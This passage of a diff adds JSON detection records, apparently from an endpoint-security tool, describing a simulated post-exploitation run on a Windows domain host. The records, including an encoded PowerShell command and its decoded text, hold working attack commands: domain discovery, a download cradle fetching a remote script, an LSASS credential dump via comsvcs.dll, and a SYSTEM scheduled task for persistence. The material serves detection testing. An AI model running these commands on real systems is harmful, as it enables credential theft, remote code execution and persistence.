+    "instance": "ENEA.valtaro.local|4944|2026-09-13T16:03:40.405215Z"
+  },
+  {
+    "type": "process",
+    "name": "WmiPrvSE.exe",
+    "alert_ids": [
+      "daab3c8b89-7c98-4059-882b-59814a5ce1b6_1",
+      "dadd192bdf-f977-47c1-bbb7-be4d240213d4_1"
+    ],
+    "path": "C:\\Windows\\System32\\wbem",
+    "sha1": "57c833dccf890b8ad092e74a1a730badee39e79d",
+    "sha256": "1d7b11c9deddad4f77e5b7f01dddda04f3747e512e0aa23d39e4226854d26ca2",
+    "size": 494592,
+    "account": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_sid": "S-1-5-20",
+    "pid": 3616,
+    "parent_pid": 752,
+    "parent_name": "svchost.exe",
+    "created": "2026-09-13T20:08:37.759001Z",
+    "parent_created": "2026-09-13T18:39:06.648492Z",
+    "command_line": "wmiprvse.exe -secured -Embedding",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|3616|2026-09-13T20:08:37.759001Z"
+  },
+  {
+    "type": "process",
+    "name": "cmd.exe",
+    "alert_ids": [
+      "daab3c8b89-7c98-4059-882b-59814a5ce1b6_1",
+      "dadd192bdf-f977-47c1-bbb7-be4d240213d4_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "99ae9c73e9bee6f9c76d6f4093a9882df06832cf",
+    "sha256": "935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2",
+    "size": 232960,
+    "account": "VALTARO\\Administrator",
+    "user_sid": "S-1-5-21-4167694581-1749342574-3371095910-500",
+    "upn": "administrator@valtaro.local",
+    "pid": 1376,
+    "parent_pid": 3616,
+    "parent_name": "WmiPrvSE.exe",
+    "created": "2026-09-13T20:08:39.078042Z",
+    "parent_created": "2026-09-13T20:08:37.759001Z",
+    "command_line": "cmd.exe /Q /c whoami & hostname 1> \\\\127.0.0.1\\ADMIN$\\__1789330146.579502 2>&1",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|1376|2026-09-13T20:08:39.078042Z"
+  },
+  {
+    "type": "file",
+    "name": "l.dmp",
+    "alert_ids": [
+      "daceecba14-35f4-4e04-9eaf-2cc2abf3619a_1",
+      "dadb3ffdd6-5840-49f1-8e6b-088bc4020d4c_1"
+    ],
+    "path": "C:\\Windows\\Temp",
+    "sha1": "dae709fad54fb9611453eea573fe678e119cdb66",
+    "sha256": "abed7f6d157e7448cc204ba7938b580711e8278b85b79f787748d2db2cb8afa5",
+    "size": 43360748,
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "file",
+    "name": "comsvcs.dll",
+    "alert_ids": [
+      "daceecba14-35f4-4e04-9eaf-2cc2abf3619a_1",
+      "dadb3ffdd6-5840-49f1-8e6b-088bc4020d4c_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "1977d4ed73cbf7a211d3dd5e9c658b538b82c4aa",
+    "sha256": "bb0e10a1ebab3ceb2768a0cc4c7984ccc0f37dcc2349721883e340561c1a09db",
+    "size": 1648128,
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "process",
+    "name": "powershell.exe",
+    "alert_ids": [
+      "dadfee89ee-3b84-44e6-a039-70a7208f958c_1"
+    ],
+    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+    "sha1": "044a0cf1f6bc478a7172bf207eef1e201a18ba02",
+    "sha256": "ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436",
+    "size": 446976,
+    "account": "VALTARO\\Administrator",
+    "user_sid": "S-1-5-21-4167694581-1749342574-3371095910-500",
+    "upn": "administrator@valtaro.local",
+    "pid": 3308,
+    "parent_pid": 5064,
+    "parent_name": "cmd.exe",
+    "created": "2026-09-13T20:08:19.698917Z",
+    "parent_created": "2026-09-13T20:08:19.649033Z",
+    "command_line": "powershell  -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFsARQBOAEUAQQBdACAAPQA9AD0AIABEAGkAcwBjAG8AdgBlAHIAeQAgACgAVAAxADAAOAA3AC8AVAAxADAAMQA4AC8AVAAxADAANgA5ACkAIAA9AD0APQAiAAoAdwBoAG8AYQBtAGkAIAAvAGEAbABsAAoAbgBlAHQAIABnAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgAgAC8AZABvAG0AYQBpAG4ACgBuAGwAdABlAHMAdAAgAC8AZABjAGwAaQBzAHQAOgB2AGEAbAB0AGEAcgBvAC4AbABvAGMAYQBsAAoAbgBlAHQAIAB1AHMAZQByACAALwBkAG8AbQBhAGkAbgAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBbAEUATgBFAEEAXQAgAD0APQA9ACAAUwB1AHMAcABpAGMAaQBvAHUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABkAG8AdwBuAGwAbwBhAGQAIABjAHIAYQBkAGwAZQAgACsAIABBAE0AUwBJACAAKABUADEAMAA1ADkALgAwADAAMQApACAAPQA9AD0AIgAKAHQAcgB5ACAAewAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYALgA1ADAALgAxADAAMQAvAGEALgBwAHMAMQAnACkAIAB9ACAAYwBhAHQAYwBoACAAewB9AAoAJwBBAE0AUwBJACAAVABlAHMAdAAgAFMAYQBtAHAAbABlADoAIAA3AGUANwAyAGMAMwBjAGUALQA4ADYAMQBiAC0ANAAzADMAOQAtADgANwA0ADAALQAwAGEAYwAxADQAOAA0AGMAMQAzADgANgAnAAoAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFsARQBOAEUAQQBdACAAPQA9AD0AIABMAFMAQQBTAFMAIABjAHIAZQBkAGUAbgB0AGkAYQBsACAAZAB1AG0AcAAgAHYAaQBhACAAYwBvAG0AcwB2AGMAcwAgACgAVAAxADAAMAAzAC4AMAAwADEAKQAgAD0APQA9ACIACgAkAHAAPQAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4ASQBkAAoAYwBtAGQAIAAvAGMAIAAiAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBtAHMAdgBjAHMALgBkAGwAbAAsACAATQBpAG4AaQBEAHUAbQBwACAAJABwACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABsAC4AZABtAHAAIABmAHUAbABsACIACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAWwBFAE4ARQBBAF0AIAA9AD0APQAgAFAAZQByAHMAaQBzAHQAZQBuAGMAZQA6ACAAcwBjAGgAZQBkAHUAbABlAGQAIAB0AGEAcwBrACAAKABUADEAMAA1ADMALgAwADAANQApACAAPQA9AD0AIgAKAHMAYwBoAHQAYQBzAGsAcwAgAC8AYwByAGUAYQB0AGUAIAAvAHQAbgAgACIAVgBhAGwAdABhAHIAbwBVAHAAZABhAHQAZQByACIAIAAvAHQAcgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAYQBsAGMALgBlAHgAZQAiACAALwBzAGMAIABvAG4AbABvAGcAbwBuACAALwByAHUAIABTAFkAUwBUAEUATQAgAC8AZgAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBbAEUATgBFAEEAXQAgAD0APQA9ACAAcABvAHMAdAAtAGUAeAAgAGQAbwBuAGUAIAA9AD0APQAiAAoA",
+    "decoded_command": "Write-Output \"[ENEA] === Discovery (T1087/T1018/T1069) ===\"\nwhoami /all\nnet group \"Domain Admins\" /domain\nnltest /dclist:valtaro.local\nnet user /domain\nWrite-Output \"[ENEA] === Suspicious PowerShell download cradle + AMSI (T1059.001) ===\"\ntry { IEX (New-Object Net.WebClient).DownloadString('http://10.6.50.101/a.ps1') } catch {}\n'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'\nWrite-Output \"[ENEA] === LSASS credential dump via comsvcs (T1003.001) ===\"\n$p=(Get-Process lsass).Id\ncmd /c \"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $p C:\\Windows\\Temp\\l.dmp full\"\nWrite-Output \"[ENEA] === Persistence: scheduled task (T1053.005) ===\"\nschtasks /create /tn \"ValtaroUpdater\" /tr \"C:\\Windows\\System32\\calc.exe\" /sc onlogon /ru SYSTEM /f\nWrite-Output \"[ENEA] === post-ex done ===\"\n",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|3308|2026-09-13T20:08:19.698917Z"
+  }
+]
